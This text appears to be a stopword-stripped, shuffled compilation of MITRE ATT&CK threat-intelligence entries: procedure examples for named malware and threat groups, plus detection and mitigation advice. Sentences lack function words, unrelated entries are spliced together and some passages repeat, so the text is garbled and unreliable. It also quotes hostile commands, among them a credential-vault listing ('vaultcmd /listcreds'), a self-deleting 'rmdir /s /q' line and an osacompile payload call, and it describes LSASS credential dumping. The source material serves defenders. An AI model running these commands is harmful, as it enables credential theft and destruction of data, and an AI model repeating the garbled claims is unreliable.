For network devices, monitor executed commands AAA logs, unexpected unauthorized users. Monitor newly executed processes suspicious activity listing credentials Windows Credentials locker (e.g. <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes Windows Vault) (Citation: AhnLab Andariel Subgroup Lazarus June 2018) analyzing self-signed code signing certificates features adversary developers, thumbprint, algorithm used, validity period, common name. Malware repositories identify additional samples adversary identify patterns adversary crafting self-signed code signing certificates.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused follow-on behavior, [Code Signing](https://attack.mitre.org/techniques/T1553/002) [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004). Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Rising Sun](https://attack.mitre.org/software/S0448) identified OS product compromised host searching registry `SOFTWARE\MICROSOFT\Windows NT\ CurrentVersion | ProductName`.(Citation: McAfee Sharpshooter December 2018) (Citation: Accenture HyperStack October 2020) Preemptively search files passwords actions reduce exposure risk found. [Zeus Panda](https://attack.mitre.org/software/S0330) collects OS version, architecture, name, product ID, install date, keyboard mapping determine language system.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017) [Carberp](https://attack.mitre.org/software/S0484) collected operating version infected system.(Citation: Prevx Carberp March 2011) [Taidoor](https://attack.mitre.org/software/S0011) relied victim malicious email attachment.(Citation: TrendMicro Taidoor) [CosmicDuke](https://attack.mitre.org/software/S0050) steals user files local hard drives file extensions match predefined list.(Citation: F-Secure Cosmicduke) [Wizard Spider](https://attack.mitre.org/groups/G0102) shut uninstalled security applications victim systems prevent ransomware executing.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020) [APT3](https://attack.mitre.org/groups/G0022) tool list running processes.(Citation: FireEye Clandestine Fox)(Citation: evolution pirpi) [Lazarus Group](https://attack.mitre.org/groups/G0032) replaced `win_fw.dll`, internal component executed IDA Pro installation, malicious DLL download execute payload.(Citation: ESET Twitter Ida Pro Nov 2021) Audit domain local accounts permission levels routinely situations adversary gain wide access obtaining credentials privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Privilege) audits include default accounts enabled, local accounts created authorized. Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: Securing Privileged Access)

Limit access root account prevent users modifying protected components proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) limiting Privilege Escalation opportunities.

Limit on-premises accounts access hybrid identity solution place. example, limit Azure Global Administrator accounts required, ensure dedicated cloud-only accounts hybrid ones.(Citation: MagicWeb) [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tools [LaZagne](https://attack.mitre.org/software/S0349) steal credentials accounts logged compromised Outlook Access.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018)(Citation: FireEye APT34 July 2019) [OilRig](https://attack.mitre.org/groups/G0049) tool named PICKPOCKET dump passwords browsers.(Citation: FireEye APT34 July 2019) Monitor newly executed processes arguments delete alter generated artifacts host system, including logs captured files quarantined emails. Monitor newly created windows registry achieve persistence adding program startup folder referencing Registry key. [Fox Kitten](https://attack.mitre.org/groups/G0117) valid credentials services lateral movement.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Winnti Group](https://attack.mitre.org/groups/G0044) program named ff.exe search specific documents compromised hosts.(Citation: Kaspersky Winnti April 2013) [APT-C-36](https://attack.mitre.org/groups/G0099) port 4050 C2 communications.(Citation: QiAnXin APT-C-36 Feb2019) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors legitimate Windows services `IKEEXT` `PrintNotify` side-load malicious DLLs.(Citation: Cybereason OperationCuckooBees 2022) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Flagpro](https://attack.mitre.org/software/S0696) distributed spearphishing email attachment.(Citation: NTT Security Flagpro December 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) malware C2.(Citation: Securelist LuckyMouse June 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154) WMI deliver payload remote host.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020)(Citation: DFIR Conti Bazar Nov 2021) [Exaramel Linux](https://attack.mitre.org/software/S0401) RC4 encrypting configuration.(Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) [SILENTTRINITY](https://attack.mitre.org/software/S0692) tracks `TrustedHosts` laterally targets WinRM.(Citation: GitHub SILENTTRINITY Modules July 2019) Ensure proper access isolation critical network systems firewalls, account privilege separation, policy, multi-factor authentication. [HDoor](https://attack.mitre.org/software/S0061) scans identify ports victim.(Citation: Baumgartner Naikon 2015) [Goopy](https://attack.mitre.org/software/S0477) ability exfiltrate data Outlook C2 channel.(Citation: Cybereason Cobalt Kitty 2017) [Bonadan](https://attack.mitre.org/software/S0486) download additional modules C2 server.(Citation: ESET ForSSHe December 2018) [Kimsuky](https://attack.mitre.org/groups/G0094) downloaded additional malware scheduled tasks.(Citation: KISA Operation Muzabi) Configure browsers/applications regularly delete persistent cookies. [Higaisa](https://attack.mitre.org/groups/G0126) <code>cmd.exe</code> execution.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020) [EXOTIC LILY](https://attack.mitre.org/groups/G1011)  uploaded malicious payloads file-sharing services including TransferNow, TransferXL, WeTransfer, OneDrive.(Citation: Google EXOTIC LILY March 2022) [BOOSTWRITE](https://attack.mitre.org/software/S0415) DWriteCreateFactory() function load additional modules.(Citation: FireEye FIN7 Oct 2019) [Exaramel Linux](https://attack.mitre.org/software/S0401) command execute command system.(Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) [FinFisher](https://attack.mitre.org/software/S0182) checks victim OS 32 64-bit.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [OopsIE](https://attack.mitre.org/software/S0264) checks configured "Daylight" time checks specific region set timezone.(Citation: Unit 42 OilRig Sept 2018) Monitor executed commands arguments register WMI persistence, <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet (Citation: Register-WmiEvent) [Bonadan](https://attack.mitre.org/software/S0486) discovered username user running backdoor.(Citation: ESET ForSSHe December 2018) [Dragonfly](https://attack.mitre.org/groups/G0035) moved laterally RDP.(Citation: US-CERT TA18-074A) [InvisiMole](https://attack.mitre.org/software/S0260) .lnk shortcut Control Panel establish persistence.(Citation: ESET InvisiMole June 2020) [Zeus Panda](https://attack.mitre.org/software/S0330) adds persistence creating Registry keys.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Dragonfly](https://attack.mitre.org/groups/G0035) gathered hashed user credentials SMB spearphishing attachments external resource links modifying .LNK file icon resources collect credentials virtualized systems.(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021) (Citation: SentinelOne Aoqin Dragon June 2022) (Citation: CISA SoreFang July 2016) [HermeticWiper](https://attack.mitre.org/software/S0697) create services aid executing payload.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Qualys Hermetic Wiper March 2022) [APT32](https://attack.mitre.org/groups/G0050) <code>netstat -anpo tcp</code> command display TCP connections victim's machine.(Citation: Cybereason Cobalt Kitty 2017) [APT32](https://attack.mitre.org/groups/G0050) WindowStyle parameter conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows. (Citation: FireEye APT32 2017) (Citation: Cybereason Cobalt Kitty 2017) [MURKYTOP](https://attack.mitre.org/software/S0233) capability scan ports hosts connected network.(Citation: FireEye Periscope March 2018) Monitor newly executed processes establish persistence executing malicious content triggered user inactivity. Monitor executed commands arguments attempt listing security software, configurations, defensive tools, sensors installed cloud environment. Adversaries install AppCertDLL binaries execute technique. Identify block malicious software executed AppCertDLLs functionality application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [BLINDINGCAN](https://attack.mitre.org/software/S0520) delivered phishing emails malicious Office documents.(Citation: US-CERT BLINDINGCAN Aug 2020) [BADNEWS](https://attack.mitre.org/software/S0128) copies documents 15MB victim user's <code>%temp%\SMB\</code> folder. copies files USB devices predefined directory.(Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) [APT32](https://attack.mitre.org/groups/G0050) Invoke-Obfuscation framework obfuscate PowerShell performs code obfuscation. [APT32](https://attack.mitre.org/groups/G0050) encoded payloads Base64 framework called "Dont-Kill-My-Cat (DKMC). [APT32](https://attack.mitre.org/groups/G0050) encrypts library network exfiltration AES-256 CBC mode macOS backdoor.(Citation: FireEye APT32 2017)(Citation: GitHub Invoke-Obfuscation)(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: ESET OceanLotus macOS April 2019) Monitor deletion Windows Registry values services startup programs correspond security tools HKLM:\SOFTWARE\Microsoft\AMSI\Providers. [SUGARDUMP](https://attack.mitre.org/software/S1042) variant SMTP C2.(Citation: Mandiant UNC3890 Aug 2022) [Get2](https://attack.mitre.org/software/S0460) ability send collected infected host C2.(Citation: Proofpoint TA505 October 2019) [Industroyer](https://attack.mitre.org/software/S0604) custom DoS tool leverages CVE-2015-5374 targets hardcoded IP addresses Siemens SIPROTEC devices.(Citation: ESET Industroyer) [Waterbear](https://attack.mitre.org/software/S0579) hook <code>ZwOpenProcess</code> <code>GetExtendedTcpTable</code> APIs called process security product hide PIDs TCP records detection.(Citation: Trend Micro Waterbear December 2019) [Pteranodon](https://attack.mitre.org/software/S0147) schedules tasks invoke components establish persistence.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: Symantec Shuckworm January 2022) [CallMe](https://attack.mitre.org/software/S0077) exfiltrates data C2 server protocol C2 communications.(Citation: Scarlet Mimic Jan 2016) Prevent users changing <code>HISTCONTROL</code>, <code>HISTFILE</code>, <code>HISTFILESIZE</code> environment variables. (Citation: Securing bash history) [Kimsuky](https://attack.mitre.org/groups/G0094) renamed malware legitimate names <code>ESTCommon.dll</code> <code>patch.dll</code>.(Citation: KISA Operation Muzabi) Monitor unexpected deletion file manipulate external outcomes hide activity  [Saint Bot](https://attack.mitre.org/software/S1018) search compromised host specific files.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Pandora](https://attack.mitre.org/software/S0664) start inject code `svchost` process.(Citation: Trend Micro Iron Tiger April 2021) [Wingbird](https://attack.mitre.org/software/S0176) exploits CVE-2016-4117 executable gain escalated privileges.(Citation: SIR 21) Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. [Calisto](https://attack.mitre.org/software/S0274) hidden directory named .calisto store data victim’s machine exfiltration.(Citation: Securelist Calisto July 2018)(Citation: Symantec Calisto July 2018) [SharpStage](https://attack.mitre.org/software/S0546)  target Arabic-speaking users code checks compromised machine Arabic language installed.(Citation: BleepingComputer Molerats Dec 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) enabled TCP port 587 C2 communications.(Citation: Fortinet Agent Tesla April 2018)(Citation: Talos Agent Tesla Oct 2018) [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader reflectively loaded .NET-based assembly/payloads memory.(Citation: MSTIC FoggyWeb September 2021) reconnaissance modules [Duqu](https://attack.mitre.org/software/S0038) collect network configuration.(Citation: Symantec W32.Duqu) Monitor service driver installations loads (ex: Sysmon Event 6) software update/patch cycles. Detection Endpoint DoS achieved sufficient impact availability service, response time typically requires aggressive monitoring responsiveness. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) [zwShell](https://attack.mitre.org/software/S0350) launch command-line shells.(Citation: McAfee Night Dragon) [PcShare](https://attack.mitre.org/software/S1050) variety Windows API functions.(Citation: Bitdefender FunnyDream Campaign November 2020) [Zebrocy](https://attack.mitre.org/software/S0251) raw sockets communicate C2 server.(Citation: Palo Alto Sofacy 06-2018) [InvisiMole](https://attack.mitre.org/software/S0260) launched DLL search hijacking wrapper DLL folder explorer.exe loaded startup Windows Explorer process legitimate library.(Citation: ESET InvisiMole June 2018) (Citation: McAfee Honeybee)  [APT28](https://attack.mitre.org/groups/G0007) "junk data" encoded string, preventing trivial decoding knowledge junk removal algorithm. implant "junk length" created, tracked controller software seamless communication prevent analysis command protocol wire.(Citation: FireEye APT28) [Agent.btz](https://attack.mitre.org/software/S0092) collects network adapter’s IP MAC address IP addresses network adapter’s default gateway, primary/secondary WINS, DHCP, DNS servers, saves log file.(Citation: ThreatExpert Agent.btz) [Stuxnet](https://attack.mitre.org/software/S0603) schedules network job execute minutes host infection.(Citation: Symantec W.32 Stuxnet Dossier) multi-factor authentication. possible, enable multi-factor authentication externally facing services. [UNC2452](https://attack.mitre.org/groups/G0118) exploited CVE-2020-0688 Exchange Control Panel regain access network.(Citation: Volexity SolarWinds) [BadPatch](https://attack.mitre.org/software/S0337) collects files local extensions, prepares exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.(Citation: Unit 42 BadPatch Oct 2017) [TrickBot](https://attack.mitre.org/software/S0266) <code>Nt*</code> [Native API](https://attack.mitre.org/techniques/T1106) functions inject code legitimate processes <code>wermgr.exe</code>.(Citation: Joe Trickbot) application whitelisting configured block execution CMSTP.exe required network prevent potential misuse adversaries. (Citation: MSitPros CMSTP Aug 2017) [Winnti Windows](https://attack.mitre.org/software/S0141) ability encapsulated HTTP/S C2 communications.(Citation: Novetta Winnti April 2015) [QUADAGENT](https://attack.mitre.org/software/S0269) multiple protocols (HTTPS, HTTP, DNS) C2 server fallback channels communication unsuccessful.(Citation: Unit 42 QUADAGENT July 2018) (Citation: ClearSky Wilted Tulip July 2017) [SILENTTRINITY](https://attack.mitre.org/software/S0692) bypass ScriptBlock logging execute unmanaged PowerShell code memory.(Citation: GitHub SILENTTRINITY Modules July 2019) proxies enforce external network communication policy prevents unauthorized external services. [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors established email addresses register domains operations.(Citation: Cylance Dust Storm) [HermeticWizard](https://attack.mitre.org/software/S0698) ability encrypt files reverse XOR loop.(Citation: ESET Hermetic Wizard March 2022) [Threat Group-3390](https://attack.mitre.org/groups/G0027) detached network shares exfiltrating files, evade detection.(Citation: SecureWorks BRONZE UNION June 2017) [Cobalt Strike](https://attack.mitre.org/software/S0154) recover hashed passwords.(Citation: cobaltstrike manual) [Cryptoistic](https://attack.mitre.org/software/S0498) ability send receive files.(Citation: SentinelOne Lazarus macOS July 2020)  [APT32](https://attack.mitre.org/groups/G0050) abused PasswordChangeNotify monitor capture account password changes.(Citation: Cybereason Cobalt Kitty 2017) [MacMa](https://attack.mitre.org/software/S1016) removed `com.apple.quarantineattribute` dropped file, `$TMPDIR/airportpaird`.(Citation: ESET DazzleSpy Jan 2022) [Gelsemium](https://attack.mitre.org/software/S0666) unverified signatures malicious DLLs.(Citation: ESET Gelsemium June 2021) [Maze](https://attack.mitre.org/software/S0449) disabled dynamic analysis security tools including IDA debugger, x32dbg, OllyDbg.(Citation: McAfee Maze March 2020) disabled Windows Defender's Real-Time Monitoring feature attempted disable endpoint protection services.(Citation: Sophos Maze VM September 2020) Refer NIST guidelines creating password policies.  (Citation: NIST 800-63-3) [HAFNIUM](https://attack.mitre.org/groups/G0125) open-source C2 frameworks, including Covenant.(Citation: HAFNIUM March 2020) [PowerShower](https://attack.mitre.org/software/S0441) registry key future powershell.exe instances spawned coordinates window position off-screen default.(Citation: Unit 42 Inception November 2018) (Citation: Crowdstrike Indrik November 2018)(Citation: Crowdstrike EvilCorp March 2021) [APT32](https://attack.mitre.org/groups/G0050) collected e-mail addresses activists bloggers target spyware.(Citation: Amnesty Intl. Ocean Lotus February 2021) [Ke3chang](https://attack.mitre.org/groups/G0004) backdoors achieved persistence adding key.(Citation: NCC APT15 Alive Strong) Windows 10, enable Attack Surface Reduction (ASR) rules prevent malware abusing WMI attain persistence.(Citation: win10_asr) [CookieMiner](https://attack.mitre.org/software/S0492) Unix script series commands targeting macOS.(Citation: Unit42 CookieMiner Jan 2019) [CORESHELL](https://attack.mitre.org/software/S0137) established persistence creating autostart extensibility (ASEP) Registry entries key Registry keys, creating shortcuts Internet Explorer Quick Start folder.(Citation: SIR 19) environment variables command history read ensure history preserved.(Citation: Securing bash history) [esentutl](https://attack.mitre.org/software/S0404) collect data local file systems.(Citation: Red Canary 2021 Threat Detection Report March 2021) [Green Lambert](https://attack.mitre.org/software/S0690) disguised Growl file.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021) [KGH_SPY](https://attack.mitre.org/software/S0526) save collected file named "info" exfiltration.(Citation: Cybereason Kimsuky November 2020) [Maze](https://attack.mitre.org/software/S0449) stopped SQL services ensure encrypt database.(Citation: Sophos Maze VM September 2020)  [SharpStage](https://attack.mitre.org/software/S0546) WMI execution.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) [QakBot](https://attack.mitre.org/software/S0650) execute WMI queries gather information.(Citation: Kaspersky QakBot September 2021) Monitor newly executed processes abuse Office "Office Test" Registry key persistence compromised system. [down_new](https://attack.mitre.org/software/S0472) ability identify MAC address compromised host.(Citation: Trend Micro Tick November 2019) [Earth Lusca](https://attack.mitre.org/groups/G1006) acquired multiple servers operations, server role.(Citation: TrendMicro EarthLusca 2022) [Micropsia](https://attack.mitre.org/software/S0339) searches anti-virus software firewall products installed victim’s machine WMI.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [Clambling](https://attack.mitre.org/software/S0660) identify username compromised host.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [GoldMax](https://attack.mitre.org/software/S0588) exfiltrate files existing C2 channel.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) [Fox Kitten](https://attack.mitre.org/groups/G0117) tools including NMAP conduct broad scanning identify ports.(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor API calls attempt hide artifacts behaviors evade detection. [Lizar](https://attack.mitre.org/software/S0681) retrieve network compromised host.(Citation: BiZone Lizar 2021) [Cryptoistic](https://attack.mitre.org/software/S0498) TCP communications C2.(Citation: SentinelOne Lazarus macOS July 2020) [SysUpdate](https://attack.mitre.org/software/S0663) packed binaries.(Citation: Trend Micro Iron Tiger April 2021) [HyperBro](https://attack.mitre.org/software/S0398) ability delete file.(Citation: Unit42 Emissary Panda 2019) [Kinsing](https://attack.mitre.org/software/S0599) downloaded additional lateral movement scripts C2.(Citation: Aqua Kinsing April 2020) Limit user access utilities 'systemctl' 'systemd-run' users legitimate need. [NanoCore](https://attack.mitre.org/software/S0336) creates RunOnce key Registry execute VBS scripts time user logs machine.(Citation: Cofense NanoCore Mar 2018) [RDAT](https://attack.mitre.org/software/S0495) encoded data subdomains AES ciphertext communicate host C2.(Citation: Unit42 RDAT July 2020) [Crutch](https://attack.mitre.org/software/S0538) staged stolen files <code>C:\AMD\Temp</code> directory.(Citation: ESET Crutch December 2020) [AppleJeus](https://attack.mitre.org/software/S0584) required user execution malicious MSI installer.(Citation: CISA AppleJeus Feb 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors compromised servers C2.(Citation: McAfee Night Dragon) [BONDUPDATER](https://attack.mitre.org/software/S0360) download upload files C2 server.(Citation: Palo Alto OilRig Sep 2018) [Milan](https://attack.mitre.org/software/S1015) delete files `C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`.(Citation: ClearSky Siamesekitten August 2021) [KGH_SPY](https://attack.mitre.org/software/S0526) collect installed applications.(Citation: Cybereason Kimsuky November 2020) [PLEAD](https://attack.mitre.org/software/S0435) ability list processes compromised host.(Citation: TrendMicro BlackTech June 2017) Monitor newly executed processes enumerate files directories search specific locations host network share file system. [TYPEFRAME](https://attack.mitre.org/software/S0263) uninstall malware components batch script.(Citation: US-CERT TYPEFRAME June 2018) [TYPEFRAME](https://attack.mitre.org/software/S0263) execute commands shell.(Citation: US-CERT TYPEFRAME June 2018) [KGH_SPY](https://attack.mitre.org/software/S0526) collect drive compromised host.(Citation: Cybereason Kimsuky November 2020) Monitor objects loading DLLs modules typically application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) [SILENTTRINITY](https://attack.mitre.org/software/S0692) establish LNK file startup folder persistence.(Citation: GitHub SILENTTRINITY Modules July 2019) Compare checksum operating file checksum trusted source. embedded network device platforms capability calculate checksum file, not. platforms capability, recommended download file trusted calculate checksum software compromised.https://tools.cisco.com/security/center/resources/integrity_assurance.html#7

Many vendors embedded network devices provide advanced debugging support device owners validate integrity operating running memory. compromise operating suspected, contact vendor technical support seek services inspection current running system. https://tools.cisco.com/security/center/resources/integrity_assurance.html#13 [Small Sieve](https://attack.mitre.org/software/S1035) ability Telegram Bot API Telegram Messenger send receive messages.(Citation: NCSC GCHQ Sieve Jan 2022) [Cadelspy](https://attack.mitre.org/software/S0454) ability capture screenshots webcam photos.(Citation: Symantec Chafer Dec 2015) [Hikit](https://attack.mitre.org/software/S0009) upload files compromised machines.(Citation: Novetta-Axiom) [PowerShower](https://attack.mitre.org/software/S0441) 7Zip compress .txt, .pdf, .xls .doc files prior exfiltration.(Citation: Kaspersky Cloud Atlas August 2019) [Gamaredon Group](https://attack.mitre.org/groups/G0047) delivered self-extracting 7z archive files malicious document attachments, obfuscated encrypted scripts.(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: CERT-EE Gamaredon January 2021)(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022) Monitor newly constructed processes assist lateral tool transfers.  [Nebulae](https://attack.mitre.org/software/S0630) list files directories compromised host.(Citation: Bitdefender Naikon April 2021) [T9000](https://attack.mitre.org/software/S0098) screenshots desktop target application windows, saving user directories byte XOR encrypted .dat files.(Citation: Palo Alto T9000 Feb 2016) Analyzing DLL exports comparing runtime arguments uncovering obfuscated function calls. implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [Pony](https://attack.mitre.org/software/S0453) dictionary common passwords collected list local accounts.(Citation: Malwarebytes Pony April 2016)	 [Cobalt Strike](https://attack.mitre.org/software/S0154) tokens credentials.(Citation: cobaltstrike manual) blocking execution vulnerable drivers adversaries exploit execute code kernel mode. Validate driver block rules audit mode ensure stability prior production deployment.(Citation: Driver Block Rules) [JHUHUGIT](https://attack.mitre.org/software/S0044) executed rundll32.exe.(Citation: F-Secure Sofacy 2015)(Citation: Talos Seduploader Oct 2017) [IndigoZebra](https://attack.mitre.org/groups/G0136) spearphishing emails malicious password-protected RAR attachments.(Citation: HackerNews IndigoZebra July 2021)(Citation: Checkpoint IndigoZebra July 2021) [FIN7](https://attack.mitre.org/groups/G0046)'s Harpy backdoor malware DNS backup channel C2 fails.(Citation: Crowdstrike GTR2020 Mar 2020) [ZxShell](https://attack.mitre.org/software/S0412) feature perform SYN flood attack host.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)  Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Operators deploying [Netwalker](https://attack.mitre.org/software/S0457) psexec certutil retrieve [Netwalker](https://attack.mitre.org/software/S0457) payload.(Citation: Sophos Netwalker 2020) [FruitFly](https://attack.mitre.org/software/S0277) specific files file types.(Citation: objsee mac malware 2017) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). unusual netsh.exe child processes environments. Monitor process executions investigate child processes spawned netsh.exe malicious behavior. [Chimera](https://attack.mitre.org/groups/G0114) collected credentials target organization previous breaches brute force attacks.(Citation: NCC Chimera January 2021) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tools download malicious files compromised hosts.(Citation: Zscaler APT31 Covid-19 October 2020) [Kwampirs](https://attack.mitre.org/software/S0236) collects password policy command <code>net accounts</code>.(Citation: Symantec Orangeworm April 2018) [Ebury](https://attack.mitre.org/software/S0377) installed self-signed RPM package mimicking original package RPM based systems.(Citation: ESET Ebury Feb 2014) Ensure proper user permissions prevent adversaries disabling interfering security services. [CharmPower](https://attack.mitre.org/software/S0674) ability capture screenshots.(Citation: Check APT35 CharmPower January 2022) [ThiefQuest](https://attack.mitre.org/software/S0595) API perform behaviors executing payloads performing local enumeration.(Citation: wardle evilquest partii) [HermeticWizard](https://attack.mitre.org/software/S0698) ability create process `rundll32`.(Citation: ESET Hermetic Wizard March 2022) [InvisiMole](https://attack.mitre.org/software/S0260) scan network ports vulnerable instances RDP SMB protocols.(Citation: ESET InvisiMole June 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) process hollowing create manipulate processes sections unmapped memory reallocating space malicious code.(Citation: SentinelLabs Agent Tesla Aug 2020)  [Olympic Destroyer](https://attack.mitre.org/software/S0365) [PsExec](https://attack.mitre.org/software/S0029) interact <code>ADMIN$</code> network share execute commands remote systems.(Citation: Talos Olympic Destroyer 2018)(Citation: PsExec Russinovich) [Sandworm Team](https://attack.mitre.org/groups/G0034) UPX pack [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Dragos Crashoverride 2018)  [Egregor](https://attack.mitre.org/software/S0554) checked LogMein event log attempt encrypt files remote machines.(Citation: Cyble Egregor Oct 2020) [StrongPity](https://attack.mitre.org/software/S0491) determine user logged checking explorer.exe running.(Citation: Talos Promethium June 2020) [XCSSET](https://attack.mitre.org/software/S0658) `mdfind` enumerate list apps grant screen sharing permissions.(Citation: Application Bundle Manipulation Brandon Dalton) [BlackEnergy](https://attack.mitre.org/software/S0089) gathered network IP configurations [ipconfig](https://attack.mitre.org/software/S0100).exe routing tables [route](https://attack.mitre.org/software/S0103).exe.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014) SecretsDump [Mimikatz](https://attack.mitre.org/software/S0002) modules [Impacket](https://attack.mitre.org/software/S0357) perform credential dumping account password information.(Citation: Impacket Tools) [XCSSET](https://attack.mitre.org/software/S0658) script execute Mach-o files <code>osacompile</code> commands as, <code>osacompile -x -o xcode.app main.applescript</code>.(Citation: trendmicro xcsset xcode project 2020) Monitor unexpected processes interacting lsass.exe.(Citation: Medium Detecting Attempts Steal Passwords Memory) Common credential dumpers [Mimikatz](https://attack.mitre.org/software/S0002) access LSA Subsystem Service (LSASS) process process, locating LSA secrets key, decrypting sections memory credential details stored. Credential dumpers methods reflective [Process Injection](https://attack.mitre.org/techniques/T1055) reduce potential indicators malicious activity.
##### Linux
To passwords hashes stored memory, processes maps file /proc filesystem process analyzed. file stored path <code>/proc/&lt;pid&gt;/maps</code>, <code>&lt;pid&gt;</code> directory unique pid program interrogated authentication data. AuditD monitoring tool, ships stock Linux distributions, watch hostile processes file proc file system, alerting pid, process name, arguments programs. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [AppleJeus](https://attack.mitre.org/software/S0584) XOR-encrypted collected prior sending C2. [AppleJeus](https://attack.mitre.org/software/S0584) source ADVObfuscation library components.(Citation: CISA AppleJeus Feb 2021) Windows 10, enable Attack Surface Reduction (ASR) rules secure LSASS prevent credential stealing. (Citation: win10_asr) [APT1](https://attack.mitre.org/groups/G0006) spearphishing emails malicious attachments.(Citation: Mandiant APT1) Restrict administrator accounts individuals possible, privilege principles.  Prevent credential overlap systems administrator privileged accounts, network non-network platforms, servers endpoints. [JPIN](https://attack.mitre.org/software/S0201) list running services.(Citation: PLATINUM April 2016) [DarkWatchman](https://attack.mitre.org/software/S0673) track key presses keylogger module.(Citation: Prevailion DarkWatchman 2021) [CrackMapExec](https://attack.mitre.org/software/S0488) collect DNS targeted system.(Citation: CME Github September 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154) exploit Oracle Java vulnerabilities execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, CVE-2013-2460.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [SHARPSTATS](https://attack.mitre.org/software/S0450) ability identify IP address, machine name, OS compromised host.(Citation: TrendMicro POWERSTATS V3 June 2019) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) identify removable media attached victim's machines.(Citation: SentinelOne Aoqin Dragon June 2022) [Metamorfo](https://attack.mitre.org/software/S0455) MSI files download additional files execute.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019)  [Azorult](https://attack.mitre.org/software/S0344) recursively search files folders collects files desktop extensions.(Citation: Unit42 Azorult Nov 2018) [FIN6](https://attack.mitre.org/groups/G0037) Plink command-line utility create SSH 